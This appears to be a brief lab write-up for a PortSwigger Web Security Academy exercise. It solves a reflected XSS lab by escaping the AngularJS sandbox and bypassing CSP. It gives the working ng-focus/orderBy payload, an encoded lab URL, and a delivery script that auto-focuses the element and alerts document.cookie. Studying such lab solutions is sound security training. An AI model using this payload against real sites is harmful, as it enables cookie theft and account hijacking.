# **Reflected XSS with AngularJS sandbox escape and CSP**

Task:  
This lab uses CSP and AngularJS.

To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts `document.cookie`.

Toolkit: Burpsuite, Browser

1. input field is search  
2. limit is 80  
3. we use latest payload

\<input id=x ng-focus=\$event.composedPath()\|orderBy:'(y=alert)(1)'\>

[https\://0a78004c04b3c6f08093a882006000bb.web-security-academy.net/?search=%3Cinput+id%3Dx+ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28y%3Dalert%29%281%29%27%3E](https://0a78004c04b3c6f08093a882006000bb.web-security-academy.net/?search=%3Cinput+id%3Dx+ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28y%3Dalert%29%281%29%27%3E)

but we still need to click on field to see pop up

4. we add in the end \#x to focus on our id=x  
5. deliver

\<script\>  
location= "https\://0a78004c04b3c6f08093a882006000bb.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=\$event.composedPath()\|orderBy:%27(z=alert)(document.cookie)%27%3E\#x"  
\</script\>